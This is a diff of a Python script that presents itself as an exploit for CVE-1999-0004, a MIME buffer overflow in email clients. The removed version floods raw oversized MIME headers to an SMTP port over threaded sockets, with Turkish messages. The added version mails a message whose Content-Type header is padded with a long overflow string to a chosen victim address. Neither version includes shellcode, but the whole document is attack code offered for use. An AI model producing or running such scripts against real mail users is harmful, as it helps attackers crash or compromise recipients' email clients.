@@ -1,73 +1,42 @@
-import socket
+#!/usr/bin/env python3
+# CVE-1999-0004 - MIME Buffer Overflow Exploit for Email Clients
+
 import argparse
-import time
-import threading
-from queue import Queue
-import struct
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
-# CVE-1999-0004: MIME buffer overflow in email clients, e.g. Solaris mailtool and Outlook.
-# This vulnerability allows remote attackers to execute arbitrary code by exploiting a buffer overflow in the MIME processing of vulnerable email clients.
+def build_mime_payload(length):
+    overflow = "A" * length
+    mime = MIMEMultipart("mixed")
+    mime["Subject"] = "Test"
+    mime["From"] = "attacker@example.com"
+    mime["To"] = "victim@example.com"
+    mime["MIME-Version"] = "1.0"
+    mime.add_header("Content-Type", "multipart/mixed;" + overflow)
+    body = MIMEText("This is the body of the email.")
+    mime.attach(body)
+    return mime.as_string()
 
-def create_payload(target_host):
-    # Example payload to exploit the MIME buffer overflow vulnerability
-    overflow_payload = b"A" * 4096  # Crafted payload to trigger buffer overflow
-    mime_header = b"Content-Type: multipart/mixed; boundary=" + overflow_payload + b"\r\n"
-    payload = mime_header + b"\r\n--" + overflow_payload + b"--\r\n"
-    return payload
-
-def send_payload(target_host, target_port, verbose):
-    payload = create_payload(target_host)
+def send_email(smtp_server, smtp_port, sender, recipient, message):
     try:
-        with socket.create_connection((target_host, target_port), timeout=10) as sock:
-            sock.sendall(payload)
-            if verbose:
-                print(f"[+] Paket gönderildi: {target_host}:{target_port}")
-    except socket.timeout:
-        if verbose:
-            print("[-] Zaman aşımı!")
-    except socket.error as e:
-        if verbose:
-            print(f"[-] Bağlantı hatası: {e}")
+        with smtplib.SMTP(smtp_server, smtp_port) as server:
+            server.sendmail(sender, recipient, message)
+            print(f"[+] Exploit email sent to {recipient}")
+    except Exception as e:
+        print(f"[!] Email delivery failed: {e}")
 
-def worker(queue, verbose):
-    while not queue.empty():
-        target_host, target_port = queue.get()
-        send_payload(target_host, target_port, verbose)
-        queue.task_done()
-
-def main(target_host, target_port, thread_count, retries, verbose):
-    for attempt in range(retries):
-        queue = Queue()
-        for _ in range(thread_count):
-            queue.put((target_host, target_port))
-
-        threads = []
-        for _ in range(thread_count):
-            t = threading.Thread(target=worker, args=(queue, verbose))
-            t.start()
-            threads.append(t)
-
-        for t in threads:
-            t.join()
-
-        if queue.empty():
-            break
-        elif attempt < retries - 1:
-            time.sleep(3)
-            if verbose:
-                print(f"[i] Tekrar deneme: {attempt + 2}/{retries}")
-
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="MIME Buffer Overflow Exploit in Email Clients (CVE-1999-0004)")
-    parser.add_argument("-t", "--target", required=True, help="Hedef sunucu IP adresi veya hostname")
-    parser.add_argument("-p", "--port", type=int, default=25, help="Hedef sunucu portu (varsayılan: 25, SMTP için)")
-    parser.add_argument("-i", "--threads", type=int, default=10, help="İş parçacığı sayısı (varsayılan: 10)")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Detaylı çıktı")
-    parser.add_argument("--retries", type=int, default=3, help="Başarısız bağlantılar için tekrar deneme sayısı (varsayılan: 3)")
-    
+def main():
+    parser = argparse.ArgumentParser(description="CVE-1999-0004 - MIME Buffer Overflow Email Exploit")
+    parser.add_argument("-s", "--smtp", required=True, help="SMTP server IP or hostname")
+    parser.add_argument("-p", "--port", type=int, default=25, help="SMTP server port (default: 25)")
+    parser.add_argument("-f", "--from", dest="sender", required=True, help="Sender email address")
+    parser.add_argument("-r", "--recipient", required=True, help="Recipient email address")
+    parser.add_argument("-l", "--length", type=int, default=1024, help="Overflow length (default: 1024)")
     args = parser.parse_args()
 
-    if args.verbose:
-        print(f"[i] Hedef: {args.target}, Port: {args.port}, Retries: {args.retries}, İş Parçacığı: {args.threads}")
+    payload = build_mime_payload(args.length)
+    send_email(args.smtp, args.port, args.sender, args.recipient, payload)
 
-    main(args.target, args.port, args.threads, args.retries, args.verbose)
+if __name__ == "__main__":
+    main()
